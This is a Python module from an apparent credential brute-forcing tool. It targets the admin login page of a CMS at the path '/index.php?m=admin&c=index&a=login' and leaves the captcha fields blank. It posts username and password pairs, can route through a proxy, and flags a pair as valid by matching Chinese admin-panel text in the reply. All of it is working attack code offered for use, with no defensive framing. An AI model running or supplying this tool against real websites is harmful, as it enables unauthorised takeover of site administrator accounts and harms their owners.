import requests
import threading
from lib.log import MyLogger

threadingLock = threading.Lock()
def run(items):
    url,user_agent,proxy,username, password=items
    url=url.strip("/")
    url=url+'/index.php?m=admin&c=index&a=login'
    header = {'User-Agent': user_agent}
    data={
        'username': username,
        'password': password,
        'geetest_challenge': '',
        'geetest_validate': '',
        'geetest_seccode':'',
        'token':''
    }
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = requests.post(url, headers=header, data=data, proxies=proxies)
    else:
        response = requests.post(url,headers=header, data=data)
    threadingLock.acquire()
    print(u'\r[#] 正在尝试凭据：'+username+"    "+password+' '*10,end='')
    # MyLogger.debug("正在尝试凭据："+username+" "+password)
    if response.status_code==200:
        if '网站后台管理中心' in response.text and '账号登录' not in response.text:
            MyLogger.success("有效凭据："+username+" "+password)
            threadingLock.release()
            return {username:password}
        else:
            print(u'\r[#] 无效凭据：' + username + "    " + password+' '*10, end='')
            # MyLogger.debug("无效凭据："+username+" "+password)
            threadingLock.release()
    else:
        threadingLock.release()
